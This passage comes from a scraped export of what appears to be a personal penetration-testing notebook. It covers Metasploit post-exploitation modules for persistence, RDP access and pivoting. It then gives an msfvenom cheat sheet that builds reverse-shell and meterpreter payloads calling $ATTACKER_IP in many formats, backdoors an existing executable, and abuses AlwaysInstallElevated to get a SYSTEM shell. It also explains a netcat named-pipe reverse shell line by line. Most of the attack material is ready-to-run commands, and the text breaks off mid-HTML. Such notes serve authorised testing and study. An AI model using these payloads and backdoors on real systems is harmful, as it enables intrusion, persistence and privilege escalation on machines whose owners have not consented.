data-slug=&quot;spells/NTLM-hashes&quot;&gt;NTLM hashes&lt;/a&gt; stored in the Metasploit DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/windows/manage/enable_rdp&lt;/code&gt; — enable RDP access (requires admin privileges)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/multi/manage/autoroute&lt;/code&gt; — manipulate target routing for pivoting&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/server/socks_proxy&lt;/code&gt; — start a SOCKS proxy&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;exploit/windows/local/persistence&lt;/code&gt; — sets up a persistent connection (you probably want to &lt;code&gt;set STARTUP SYSTEM&lt;/code&gt;)… &lt;em&gt;without a password!&lt;/em&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;It is generally more useful to background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; and then run these commands through the Metasploit console, as within &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; they need to have all options specified on the “run” command line (in the console you can access help, actually &lt;em&gt;see&lt;/em&gt; what the options are, etc.).&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;There seem to be a lot of options for the &lt;code&gt;post/multi/manage/autoroute&lt;/code&gt; and &lt;code&gt;auxiliary/server/socks_proxy&lt;/code&gt; modules, but I don’t see a way to access them from &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; (it looks like to get help you need to background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; and use the console).&lt;/p&gt;\n&lt;p&gt;The advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that you’re attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)&lt;/p&gt;\n&lt;h3 id=&quot;cifs&quot;&gt;CIFS&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#cifs&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Metasploit can also enumerate CIFS users using the &lt;code&gt;auxiliary/smb/smb_lookupsid&lt;/code&gt; module.&lt;/p&gt;\n&lt;p&gt;Like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;, I’ve found this to be a bit unreliable on UNIX-like systems.&lt;/p&gt;\n&lt;h3 id=&quot;ms-sql&quot;&gt;MS SQL&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ms-sql&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Metasploit-MS-SQL-modules&quot; data-block=&quot;&quot; data-embed-alias=&quot;spells/Metasploit MS SQL modules&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Metasploit-MS-SQL-modules&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Metasploit-MS-SQL-modules&quot;&gt;Transclude of Metasploit-MS-SQL-modules&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/msfvenom":{"slug":"spells/msfvenom","filePath":"spells/msfvenom.md","title":"msfvenom","links":["spells/netcat","spells/Exploit-Windows-HTML-applications-with-msfvenom","spells/Exploit-VBA-scripts-with-msfvenom"],"tags":["Application/Metasploit/msfvenom","AttackCycle/Exploitation","Application/netcat","OS/Linux","OS/Windows","OS/macOS","FileFormat/HTA","Application/Metasploit/meterpreter","Language/VisualBasic","Language/Bash","Language/Python","Language/Perl","Language/PHP","Language/Java"],"content":"msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:\n# Use Metasploit to generate the code for a remote shell:\n#\nmsfvenom -p cmd/unix/reverse_netcat \\\n\tlhost=$LOCAL_IP lport=$LOCAL_PORT\n \n# Spin up a listener using netcat:\n#\nnc -lvp $LOCAL_PORT\nThis will generates code that looks like this:\nmkfifo /tmp/qdsrgu; \\\nnc $LOCAL_IP $LOCAL_PORT 0&lt;/tmp/qdsrgu | \\\n\t/bin/sh &gt;/tmp/qdsrgu 2&gt;&amp;1; \\\nrm /tmp/qdsrgu\nWhat’s going on here?\n\nmkfifo /tmp/qdsrgu creates a named pipe at /tmp/qdsrgu.\nWe then spin up a netcat instance directed at our local machine (nc $LOCAL_IP $LOCAL_PORT), direct the contents of the pipe into netcat’s STDIN (0&lt; /tmp/qdsrgu), pipe the output of netcat to a shell we know probably exists (| /bin/sh), and finally redirect both STDOUT and STDERR back into the named pipe (&gt; /tmp/qdsrgu 2&gt;&amp;1).\nOn the local machine, nc -lvp $LOCAL_PORT listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh there. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.\n\nUse --list formats to see available encoding formats. In general, shell scripts can always be produced by specifying -f raw and an output file with the appropriate extension.\nLinux ELF executables\n# 32-bit Linux ELF meterpreter payload\n#\nmsfvenom -p linux/x86/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f elf -o ${NAME}\nmacOS MACH-O executables\n# 32-bit macOS MACH-O meterpreter payload\n#\nmsfvenom -p osx/x86/shell_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f macho -o ${NAME}\nWindows executables\n# 64-bit Windows executable meterpreter payload\n#\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f exe -o ${NAME}.exe\n \n# 64-bit Windows SERVICE executable (note that these require\n# additional API calls to work, beyond what `-f exe` provides)\n#\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f exe-service -o ${NAME}.exe\n \n# Add a meterpreter backdoor to an existing executable\n#\nmsfvenom -a x64 --platform windows -x $ORIGINAL_EXE -k \\\n\t-p windows/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-b &quot;\\x00&quot; -f exe -o $BACKDOORED_EXE\nNote that by default msfvenom produces 64-bit executables when using the -f exe. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  -e x86/shikata_ga_nai.\nMSI installers\nIf AlwaysInstallElevated is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nGenerate a malicious MSI file with msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f msi -o ${NAME}.msi\nThen install on the target to get a shell:\nmsiexec /quiet /qn /i $INSTALLER.msi\nHTML applications\nTransclude of Exploit-Windows-HTML-applications-with-msfvenom\nVBA scripts\nTransclude of Exploit-VBA-scripts-with-msfvenom\nBash scripts\nmsfvenom -p cmd/unix/reverse_bash \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f raw -o ${NAME}.sh\nPython scripts\nmsfvenom -p cmd/unix/reverse_python \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f raw -o ${NAME}.py\nPerl scripts\nmsfvenom -p cmd/unix/reverse_perl \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f raw -o ${NAME}.pl\nPHP scripts\nmsfvenom -p php/meterpreter_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f raw -o ${NAME}.php\nASP scripts\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f asp -o ${NAME}.asp\nJSP scripts\nmsfvenom -p java/jsp_shell_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f raw -o ${NAME}.jsp","richContent":"&lt;p&gt;msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Use Metasploit to generate the code for a remote shell:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; cmd/unix/reverse_netcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tlhost=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LOCAL_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; lport=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LOCAL_PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Spin up a listener using netcat:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lvp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This will generates code that looks like this:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkfifo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /tmp/qdsrgu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/tmp/qdsrgu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t/bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/tmp/qdsrgu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&amp;#x26;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /tmp/qdsrgu&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;What’s going on here?&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;mkfifo /tmp/qdsrgu&lt;/code&gt; creates a named pipe at /tmp/qdsrgu.&lt;/li&gt;\n&lt;li&gt;We then spin up a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; instance directed at our local machine (&lt;code&gt;nc $LOCAL_IP $LOCAL_PORT&lt;/code&gt;), direct the contents of the pipe into &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt;’s STDIN (&lt;code&gt;0&amp;#x3C; /tmp/qdsrgu&lt;/code&gt;), pipe the &lt;em&gt;output&lt;/em&gt; of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; to a shell we know probably exists (&lt;code&gt;| /bin/sh&lt;/code&gt;), and finally redirect &lt;em&gt;both&lt;/em&gt; STDOUT and STDERR back into the named pipe (&lt;code&gt;&gt; /tmp/qdsrgu 2&gt;&amp;#x26;1&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;On the local machine, &lt;code&gt;nc -lvp $LOCAL_PORT&lt;/code&gt; listens for the incoming &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh &lt;em&gt;there&lt;/em&gt;. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt;, which then sends the data to the local machine where it ends up on STDOUT.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Use &lt;code&gt;--list formats&lt;/code&gt; to see available encoding formats. &lt;em&gt;In general&lt;/em&gt;, shell scripts can always be produced by specifying &lt;code&gt;-f raw&lt;/code&gt; and an output file with the appropriate extension.&lt;/p&gt;\n&lt;h2 id=&quot;linux-elf-executables&quot;&gt;Linux ELF executables&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#linux-elf-executables&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# 32-bit Linux ELF meterpreter payload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; linux/x86/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; elf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;macos-mach-o-executables&quot;&gt;macOS MACH-O executables&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#macos-mach-o-executables&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# 32-bit macOS MACH-O meterpreter payload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; osx/x86/shell_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; macho&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;windows-executables&quot;&gt;Windows executables&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#windows-executables&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# 64-bit Windows executable meterpreter payload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span 